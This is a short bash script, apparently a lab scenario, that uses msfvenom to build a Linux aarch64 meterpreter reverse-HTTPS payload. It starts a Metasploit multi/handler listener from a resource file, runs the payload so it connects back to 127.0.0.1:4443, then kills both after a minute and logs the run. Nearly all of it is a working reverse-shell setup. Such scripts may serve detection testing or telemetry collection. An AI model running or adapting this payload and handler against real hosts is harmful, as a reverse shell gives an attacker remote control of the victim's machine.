#!/bin/bash
set +e
OUT="${OUT:-/lab/src/out}"
mkdir -p "$OUT"

msfvenom -p linux/aarch64/meterpreter_reverse_https LHOST=127.0.0.1 LPORT=4443 \
  -f elf -o /tmp/payload.elf > "$OUT/msfvenom.log" 2>&1

cat > /tmp/handler.rc <<'EOF'
use exploit/multi/handler
set PAYLOAD linux/aarch64/meterpreter_reverse_https
set LHOST 127.0.0.1
set LPORT 4443
set ExitOnSession false
set SessionRetryTotal 3600
exploit -j -z
EOF

# keep stdin open so the console (and the handler job) stays alive
tail -f /dev/null | msfconsole -q -r /tmp/handler.rc > "$OUT/msfconsole.log" 2>&1 &
MSF=$!
for i in $(seq 1 60); do
  grep -q "Exploit running as background job" "$OUT/msfconsole.log" && break
  sleep 1
done
sleep 3

chmod +x /tmp/payload.elf
/tmp/payload.elf > "$OUT/payload.log" 2>&1 &
PAY=$!
sleep 60
kill "$PAY" "$MSF" 2>/dev/null
echo "metasploit scenario done" >> "$OUT/metasploit.log"
exit 0
